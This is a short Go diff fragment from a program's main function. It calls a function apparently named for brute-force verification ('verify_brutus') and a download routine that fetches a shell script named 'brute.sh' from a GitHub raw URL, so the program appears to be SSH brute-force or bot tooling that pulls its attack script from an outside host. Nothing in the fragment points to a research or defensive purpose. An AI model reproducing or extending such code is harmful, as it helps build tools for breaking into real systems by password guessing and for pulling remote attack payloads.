@@ -18,10 +18,11 @@ func main() {
 
  
 
-go verify_brutus()
+
+verify_brutus()
  
 
-go  down_brute_ssh("https://github.com/atilabyte/golang/raw/refs/heads/master/brute.sh" , "brute.sh" )
+go  down_brute("https://github.com/atilabyte/golang/raw/refs/heads/master/brute.sh" , "brute.sh" )
 
 
 
